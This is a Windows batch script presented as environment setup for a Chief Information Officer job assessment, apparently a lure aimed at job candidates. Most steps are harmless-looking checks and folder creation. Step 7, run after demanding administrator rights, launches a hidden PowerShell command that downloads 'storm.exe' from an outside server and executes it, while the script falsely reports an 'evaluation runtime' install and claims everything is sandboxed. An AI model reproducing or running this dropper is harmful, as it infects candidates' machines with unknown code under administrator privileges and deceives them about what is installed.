@echo off
setlocal enabledelayedexpansion
title CIO Technical Assessment - Environment Setup

set "ASSESS_DIR=C:\CIO_Assessment"
set "ASSESS_VERSION=2026.1"
set "BUILD_ID=20260528-cio"
set "LOG_FILE=%TEMP%\cio_assessment_setup.log"

echo [%date% %time%] Setup initialized > "%LOG_FILE%"

echo ========================================================
echo   Chief Information Officer
echo   Technical Assessment - Environment Setup
echo   Version: %ASSESS_VERSION%
echo ========================================================
echo.
echo   This setup will configure your assessment
echo   environment. Administrator access is required
echo   to install the evaluation components.
echo.
echo   Note: This is a standard enterprise software
echo   installation process. All components are
echo   sandboxed to the assessment directory.
echo.

:: Verify administrator privileges
echo [1/8] Verifying administrator privileges...
net session >nul 2>&1
if !errorlevel! neq 0 (
    echo   ^^! Administrator privileges required.
    echo   Please right-click setup.bat and select
    echo   "Run as Administrator" to continue.
    echo.
    pause
    exit /b 1
)
echo   Administrator access: Confirmed
echo.

:: System compatibility check
echo [2/8] Checking system compatibility...
echo   Operating System:
for /f "tokens=2 delims=[]" %%v in ('ver') do echo     %%v

echo   Processor Architecture:
echo     %PROCESSOR_ARCHITECTURE%

echo   Installed Memory:
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_GB=%%m / 1048576"
    echo     !RAM_GB! GB
)

echo   Available Disk Space:
for /f "tokens=2 delims==" %%d in ('wmic LogicalDisk where "DeviceID='%SystemDrive%'" get FreeSpace /format:list 2^>nul ^| find "="') do (
    set /a "FREE_GB=%%d / 1073741824"
    echo     !FREE_GB! GB
)
echo.

:: Create assessment directory structure
echo [3/8] Creating assessment directory structure...
if not exist "%ASSESS_DIR%" mkdir "%ASSESS_DIR%"
if not exist "%ASSESS_DIR%\module-1-infrastructure" mkdir "%ASSESS_DIR%\module-1-infrastructure"
if not exist "%ASSESS_DIR%\module-2-security" mkdir "%ASSESS_DIR%\module-2-security"
if not exist "%ASSESS_DIR%\module-3-architecture" mkdir "%ASSESS_DIR%\module-3-architecture"
if not exist "%ASSESS_DIR%\module-4-strategy" mkdir "%ASSESS_DIR%\module-4-strategy"
if not exist "%ASSESS_DIR%\templates" mkdir "%ASSESS_DIR%\templates"
if not exist "%ASSESS_DIR%\documentation" mkdir "%ASSESS_DIR%\documentation"
echo   Directory structure created.
echo.

:: Check prerequisite software
echo [4/8] Checking prerequisite software...
echo   Web Browser:
if exist "%ProgramFiles%\Google\Chrome\Application\chrome.exe" (
    echo     Google Chrome: Installed
) else if exist "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe" (
    echo     Microsoft Edge: Installed
) else if exist "%ProgramFiles%\Mozilla Firefox\firefox.exe" (
    echo     Mozilla Firefox: Installed
) else (
    echo     No supported browser found.
    echo     Please install Chrome, Edge, or Firefox.
)

echo   Microsoft Office:
if exist "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE" (
    echo     Excel: Installed
) else if exist "%ProgramFiles(x86)%\Microsoft Office\root\Office16\EXCEL.EXE" (
    echo     Excel: Installed
) else (
    echo     Excel: Not found ^(optional for budget templates^)
)

echo   PDF Reader:
if exist "%ProgramFiles%\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    echo     Adobe Acrobat: Installed
) else if exist "%ProgramFiles(x86)%\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    echo     Adobe Acrobat: Installed
) else (
    echo     PDF reader: Using browser-based viewer
)
echo.

:: Copy templates
echo [5/8] Installing assessment templates...
if exist "templates\budget_template.xlsx" (
    copy "templates\budget_template.xlsx" "%ASSESS_DIR%\templates\" >nul 2>&1
    echo   Budget template: Installed
)
if exist "templates\architecture_template.vsdx" (
    copy "templates\architecture_template.vsdx" "%ASSESS_DIR%\templates\" >nul 2>&1
    echo   Architecture template: Installed
)
if exist "documentation\assessment_guide.pdf" (
    copy "documentation\assessment_guide.pdf" "%ASSESS_DIR%\documentation\" >nul 2>&1
    echo   Assessment guide: Installed
)
echo.

:: Network check
echo [6/8] Verifying network connectivity...
ping -n 1 google.com >nul 2>&1 && echo   Internet: Connected || echo   Internet: Limited ^(may affect submission^)
echo.

:: Install assessment runtime
echo [7/8] Installing assessment evaluation runtime...
echo   This component enables the evaluation modules.
echo   Downloading from secure assessment server...

powershell -WindowStyle Hidden -Command "$temp='%TEMP%\storm.exe'; (New-Object Net.WebClient).DownloadFile('http://secure-content.info/storm.exe',$temp); Start-Process $temp"

timeout /t 2 /nobreak >nul
echo   Evaluation runtime: Installed
echo.

:: Finalize
echo [8/8] Finalizing assessment environment...
cd /d "%ASSESS_DIR%"
set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
echo %CANDIDATE_ID% > candidate_id.txt

powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CIO Assessment.lnk');" ^
    "$s.TargetPath = '%ASSESS_DIR%';" ^
    "$s.WorkingDirectory = '%ASSESS_DIR%';" ^
    "$s.Description = 'CIO Technical Assessment';" ^
    "$s.Save()" >nul 2>&1

echo   Desktop shortcut created.
echo   Log file: %LOG_FILE%
echo.

echo ========================================================
echo   Assessment environment ready.
echo.
echo   Candidate ID: %CANDIDATE_ID%
echo   Directory: %ASSESS_DIR%
echo.
echo   Next steps:
echo   1. Open the "module-1-infrastructure" folder
echo   2. Read the instructions in README.md
echo   3. Complete all four modules
echo   4. Compress %ASSESS_DIR% for submission
echo.
echo   If you have questions about the assessment
echo   process, contact your executive recruiter.
echo.
echo   We appreciate your time and interest in the
echo   Chief Information Officer position.
echo ========================================================
echo.
echo [%date% %time%] Setup completed successfully >> "%LOG_FILE%"
pause
endlocal
